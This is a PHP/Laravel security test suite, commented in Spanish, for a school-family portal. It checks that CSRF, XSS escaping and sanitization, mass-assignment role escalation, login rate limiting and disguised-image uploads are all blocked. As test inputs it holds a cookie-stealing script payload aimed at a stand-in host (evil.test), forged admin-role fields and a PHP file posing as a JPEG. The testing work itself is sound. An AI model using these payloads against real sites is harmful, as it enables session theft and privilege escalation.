<?php

namespace Tests\Feature;

use App\Filament\Resources\ChildResource\Pages\EditChild;
use App\Filament\Resources\ChildResource\RelationManagers\ParentsRelationManager;
use App\Models\Child;
use App\Models\Content;
use App\Models\Environment;
use App\Models\Family;
use App\Models\User;
use Illuminate\Contracts\Encryption\Encrypter;
use Illuminate\Foundation\Http\Middleware\PreventRequestForgery;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Http\UploadedFile;
use Illuminate\Support\Facades\RateLimiter;
use Illuminate\Support\Facades\Storage;
use Livewire\Livewire;
use Tests\TestCase;

/**
 * Auditoría de seguridad puntual (no reemplaza a SecurityTest.php, que cubre
 * autorización por policy e IDOR). Cada test acá prueba una clase distinta
 * de ataque: CSRF, XSS, mass assignment, fuerza bruta y subida de archivos
 * disfrazados. Donde el framework ya protege por defecto, el test confirma
 * que NO lo desactivamos sin querer; donde encontramos un hueco real, el
 * fix va junto con el test que lo prueba.
 */
class CyberSecurityTest extends TestCase
{
    use RefreshDatabase;

    /**
     * Laravel desactiva la verificación CSRF durante los tests
     * (PreventRequestForgery::runningUnitTests()), así que un POST normal
     * con $this->post() NUNCA prueba nada de CSRF — pasaría igual aunque
     * hubiéramos roto la protección. Para probar el caso real, forzamos el
     * middleware a comportarse como en producción durante este test.
     */
    private function forzarVerificacionCsrfReal(): void
    {
        $this->app->bind(PreventRequestForgery::class, function ($app) {
            return new class($app, $app->make(Encrypter::class)) extends PreventRequestForgery
            {
                protected function runningUnitTests(): bool
                {
                    return false;
                }
            };
        });
    }

    public function test_login_sin_token_csrf_es_rechazado(): void
    {
        $this->forzarVerificacionCsrfReal();

        User::factory()->administrador()->create(['email' => 'admin@pestalozzi.test']);

        $response = $this->post('/login', [
            'email' => 'admin@pestalozzi.test',
            'password' => 'password',
        ]);

        $response->assertStatus(419);
        $this->assertGuest();
    }

    public function test_login_con_token_csrf_valido_si_funciona(): void
    {
        $this->forzarVerificacionCsrfReal();

        User::factory()->administrador()->create(['email' => 'admin@pestalozzi.test']);

        $this->startSession();

        $response = $this->post('/login', [
            '_token' => csrf_token(),
            'email' => 'admin@pestalozzi.test',
            'password' => 'password',
        ]);

        $response->assertRedirect();
        $this->assertAuthenticated();
    }

    public function test_subir_evidencia_sin_token_csrf_es_rechazado(): void
    {
        $this->forzarVerificacionCsrfReal();

        $familia = Family::factory()->create();
        $nino = Child::factory()->create(['family_id' => $familia->id]);
        $padre = User::factory()->familia($familia)->create();
        $content = Content::factory()->published()->requiresEvidence()->create();

        $response = $this->actingAs($padre)->post(
            route('mi-escuelita.evidencias.store', $content),
            ['comment' => 'Lo hicimos hoy', 'child_id' => $nino->id],
        );

        $response->assertStatus(419);
    }

    /**
     * `description` es un Textarea plano (sin editor de texto): si algún
     * día alguien reintroduce {!! $content->description !!} en el blade,
     * este test avisa antes de que llegue a producción. La guía es un rol
     * de confianza media, no un desconocido de internet, pero una cuenta
     * de guía comprometida no debería poder ejecutar JS en el navegador de
     * todas las familias.
     */
    public function test_html_en_la_descripcion_de_un_contenido_se_escapa(): void
    {
        $malicioso = '<script>document.location="https://evil.test/?c="+document.cookie</script>';

        $familia = Family::factory()->create();
        $nino = Child::factory()->create(['family_id' => $familia->id]);
        $padre = User::factory()->familia($familia)->create();

        $content = Content::factory()->published()->create([
            'description' => $malicioso,
        ]);

        $html = $this->actingAs($padre)
            ->get(route('mi-escuelita.experiencias.show', $content))
            ->getContent();

        // El payload crudo no debe aparecer sin escapar en ningun lado del
        // HTML (Livewire agrega sus propios <script> legitimos a la pagina,
        // asi que buscar la cadena maliciosa completa es lo preciso, no
        // "que no haya ningun <script> en la pagina").
        $this->assertStringNotContainsString($malicioso, $html);
        $this->assertStringContainsString(e($malicioso), $html);
    }

    /**
     * `body` sí es HTML real (RichEditor/TipTap), así que no se puede
     * escapar sin más — se renderiza vía el RichContentRenderer oficial de
     * Filament, que sanea el HTML antes de devolverlo. Probamos que un
     * <script> inyectado en el cuerpo no sobrevive esa sanitización.
     */
    public function test_html_peligroso_en_el_cuerpo_se_sanea_al_renderizar(): void
    {
        $familia = Family::factory()->create();
        $padre = User::factory()->familia($familia)->create();

        $content = Content::factory()->published()->create([
            'body' => '<p>Texto normal</p><script>alert(1)</script>',
        ]);

        $html = $this->actingAs($padre)
            ->get(route('mi-escuelita.experiencias.show', $content))
            ->getContent();

        $this->assertStringNotContainsString('<script>alert(1)</script>', $html);
        $this->assertStringContainsString('Texto normal', $html);
    }

    /**
     * Un usuario familia no puede auto-asignarse un rol de staff editando
     * su propio perfil: ProfileUpdateRequest solo valida name/email, así
     * que cualquier campo extra que mande el navegador se descarta.
     */
    public function test_familia_no_puede_autoelevarse_el_rol_desde_su_perfil(): void
    {
        $padre = User::factory()->familia()->create(['role' => User::ROLE_FAMILIA]);

        $this->actingAs($padre)->patch(route('profile.update'), [
            'name' => $padre->name,
            'email' => $padre->email,
            'role' => User::ROLE_ADMINISTRADOR,
        ]);

        $this->assertSame(User::ROLE_FAMILIA, $padre->fresh()->role);
    }

    /**
     * Refuerza el mismo principio en el punto que agregamos nosotros: el
     * alta de un padre desde ParentsRelationManager fuerza role=familia y
     * family_id server-side (ver ->using() en el manager). Si alguien
     * manipulara el payload del formulario para colarse como admin, no
     * debería funcionar.
     */
    public function test_registrar_un_padre_no_permite_colar_un_rol_distinto(): void
    {
        $admin = User::factory()->administrador()->create();
        $familia = Family::factory()->create();
        $nino = Child::factory()->create(['family_id' => $familia->id]);

        Livewire::actingAs($admin)
            ->test(ParentsRelationManager::class, [
                'ownerRecord' => $nino,
                'pageClass' => EditChild::class,
            ])
            ->callTableAction('create', data: [
                'name' => 'Intento de escalada',
                'email' => 'intento@example.com',
                'password' => 'password',
                'active' => true,
                // Estos dos no son campos del formulario, pero si algo
                // cambiara mañana y empezaran a mandarse, no deben ganarle
                // al valor forzado en el ->using() del RelationManager.
                'role' => User::ROLE_ADMINISTRADOR,
                'family_id' => Family::factory()->create()->id,
            ]);

        $creado = User::where('email', 'intento@example.com')->first();

        $this->assertSame(User::ROLE_FAMILIA, $creado->role);
        $this->assertSame($familia->id, $creado->family_id);
    }

    public function test_login_se_bloquea_tras_varios_intentos_fallidos(): void
    {
        User::factory()->administrador()->create(['email' => 'admin@pestalozzi.test']);

        RateLimiter::clear('admin@pestalozzi.test|127.0.0.1');

        for ($i = 0; $i < 5; $i++) {
            $this->post('/login', [
                'email' => 'admin@pestalozzi.test',
                'password' => 'clave-incorrecta',
            ]);
        }

        $response = $this->post('/login', [
            'email' => 'admin@pestalozzi.test',
            'password' => 'password',
        ]);

        $response->assertSessionHasErrors('email');
        $this->assertGuest();
    }

    /**
     * ->image() en el FileUpload no es solo un filtro de <input accept>
     * del navegador: Filament valida el mime real del archivo subido.
     * Probamos que un archivo que dice ser una imagen pero no lo es
     * (contenido de texto plano con extensión .jpg) se rechaza igual.
     */
    public function test_subir_un_archivo_disfrazado_de_imagen_es_rechazado(): void
    {
        Storage::fake('public');

        $admin = User::factory()->administrador()->create();
        $ambiente = Environment::factory()->create();
        $familia = Family::factory()->create();

        // UploadedFile::fake() confia en la extension declarada para el
        // contenido de createWithContent(), asi que un .jpg con bytes de
        // PHP adentro no sirve para probar esto en test. Lo que Filament
        // realmente valida (via la regla `image` de Laravel) es el MIME
        // type del archivo -- lo declaramos explicitamente como no-imagen,
        // que es exactamente el caso real: un .php renombrado a mano.
        $archivoFalso = UploadedFile::fake()->create(
            'foto.jpg',
            10,
            'application/x-httpd-php',
        );

        Livewire::actingAs($admin)
            ->test(\App\Filament\Resources\ChildResource\Pages\CreateChild::class)
            ->fillForm([
                'name' => 'Niño de prueba',
                'status' => 'active',
                'family_id' => $familia->id,
                'environment_id' => $ambiente->id,
                'photo_path' => [$archivoFalso],
            ])
            ->call('create')
            ->assertHasFormErrors(['photo_path']);
    }

    public function test_password_y_remember_token_nunca_se_serializan(): void
    {
        $user = User::factory()->create();

        $array = $user->toArray();

        $this->assertArrayNotHasKey('password', $array);
        $this->assertArrayNotHasKey('remember_token', $array);
    }
}
